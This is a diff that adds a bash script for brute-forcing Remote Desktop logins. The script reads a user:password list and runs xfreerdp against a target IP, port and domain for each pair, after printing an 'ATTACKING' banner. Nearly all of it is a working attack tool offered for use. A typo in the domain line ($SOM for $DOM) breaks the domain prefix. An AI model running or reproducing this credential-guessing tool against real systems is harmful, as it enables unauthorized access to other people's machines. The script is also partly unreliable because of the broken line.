@@ -1,0 +1,35 @@
+#!/bin/bash
+echo "usage $0 userpass.list targetip <targetport> <domain>"
+
+
+IP=$2
+PORT=$3
+DOM=$4
+
+if [ ! -z "$PORT" ]
+then
+   IP="$IP:$PORT"
+fi
+
+
+echo "ATTACKING:   $IP "
+echo " '-> DOMAIN: $DOM "
+if [ ! -z "$DOM" ] 
+then
+  DU="$SOM\\"
+  DOM="/d:$DOM"
+fi
+
+echo "press [ctrl]+[c] to cancel"
+echo " or [enter] to continue"
+read 
+clear
+
+while read d
+do
+   usr="$DU$(echo $d | cut -d\:  -f1)"
+   pas="$(echo $d | cut -d\:  -f2)"
+   echo "xfreerdp /u:$usr /p:$pas /v:$IP $DOM" 
+   xfreerdp /u:$usr /p:$pas /v:$IP $DOM && sleep 1
+
+done<$1
